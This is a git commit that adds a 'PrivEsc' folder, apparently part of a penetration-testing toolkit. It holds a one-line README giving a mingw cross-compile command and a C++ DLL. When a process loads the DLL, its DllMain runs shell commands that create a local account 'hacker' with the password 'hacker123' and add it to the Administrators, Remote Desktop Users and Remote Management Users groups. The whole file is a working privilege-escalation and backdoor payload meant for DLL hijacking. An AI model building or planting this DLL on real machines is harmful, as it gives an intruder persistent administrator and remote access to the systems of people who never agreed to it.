26c56244a68096fe1bd48400d3f85edad5132174
Akash Pandey <75413146+1337-L3V1ATH0N@users.noreply.github.com>
2024-03-14 14:19:47 +0530

    Add files via upload

---
+++ Windows-Binaries/PrivEsc/README.md
@@ -0,0 +1,3 @@
+x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+
+// to cross-compile while privesc
---
+++ Windows-Binaries/PrivEsc/myDLL.cpp
@@ -0,0 +1,26 @@
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user hacker hacker123 /add");
+  	    i = system ("net localgroup Administrators hacker /add");
+            i = system ("net localgroup \"Remote Desktop Users\" hacker /add");
+	    i = system ("net localgroup \"Remote Management Users\" hacker /add");
+	break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
